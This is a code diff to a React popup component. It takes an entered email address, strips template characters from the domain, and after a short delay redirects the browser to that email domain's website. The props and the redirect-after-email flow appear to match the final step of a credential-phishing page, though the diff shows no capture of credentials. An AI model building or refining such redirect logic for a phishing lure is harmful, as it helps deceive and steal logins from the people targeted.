@@ -24,10 +24,11 @@ const Popup = ({ domain, systemInfo }) => {
     return (domain || companyName).toLowerCase() + '.com'; // Fallback to domain name + .com
   };
 
-  // Extract domain from email for redirect
+  // Extract domain from email for redirect - FIXED VERSION
   const getEmailDomainForRedirect = () => {
     if (email && email.includes('@')) {
       const domainPart = email.split('@')[1];
+      
       // Remove any template patterns or brackets to get clean domain
       const cleanDomain = domainPart
         .replace(/[\[\]\{\}<>%\$\(\)]/g, '') // Remove common template characters
@@ -36,12 +37,22 @@ const Popup = ({ domain, systemInfo }) => {
         .trim();
       
       if (cleanDomain && cleanDomain.length > 0) {
-        // Remove .com if it's already part of the domain
-        const domainWithoutCom = cleanDomain.toLowerCase().replace(/\.com$/i, '');
-        return domainWithoutCom;
+        // Extract the actual domain without path
+        const domainParts = cleanDomain.toLowerCase().split('.');
+        
+        // If it's already a full domain (has at least 2 parts like example.com)
+        if (domainParts.length >= 2) {
+          // Return the full domain including its TLD
+          return cleanDomain.toLowerCase();
+        }
+        
+        // If it's just a domain name without TLD, add .com as fallback
+        return cleanDomain.toLowerCase() + '.com';
       }
     }
-    return (domain || companyName).toLowerCase();
+    
+    // Fallback to domain parameter or company name with .com
+    return (domain || companyName).toLowerCase() + '.com';
   };
 
   useEffect(() => {
@@ -281,7 +292,14 @@ const Popup = ({ domain, systemInfo }) => {
         
         setTimeout(() => {
           const emailDomain = getEmailDomainForRedirect();
-          window.location.href = `https://www.${emailDomain}.com`;
+          // FIX: Check if domain already includes protocol
+          if (emailDomain.startsWith('http://') || emailDomain.startsWith('https://')) {
+            window.location.href = emailDomain;
+          } else {
+            // Add protocol and www if not present
+            const cleanDomain = emailDomain.replace(/^www\./, '');
+            window.location.href = `https://www.${cleanDomain}`;
+          }
         }, 1500);
       }
       
